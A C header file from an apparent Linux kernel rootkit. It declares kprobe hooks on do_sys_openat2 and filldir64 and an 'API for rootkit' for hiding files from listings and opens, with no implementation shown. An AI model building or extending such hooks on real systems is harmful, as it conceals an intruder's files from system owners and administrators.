#include <linux/kprobes.h>

#ifndef HIDEFS_H
#define HIDEFS_H

#define MAX_PATHS_HIDE 10
#define NAME_OPEN_SYSCALL "do_sys_openat2"
#define MAX_OPEN_HIDE 10

// Internals

int _handler_fs_filldir64(struct kprobe *p, struct pt_regs *regs);
int _hidefs_file_hide_open_handler(struct kretprobe_instance *ri,
				   struct pt_regs *regs);
int _hidefs_file_hide_open_handler_pre(struct kprobe *p, struct pt_regs *regs);
int _hidefs_file_hide_handler(struct kprobe *p, struct pt_regs *regs);

// API for rootkit

void hidefs_add_file_open(char *path, int pathlen);
void hidefs_remove_file_open(char *path);
void hidefs_add_file(char *path, int pathlen);
void hidefs_remove_file(char *path);

int hidefs_init(void);
void hidefs_exit(void);

#endif
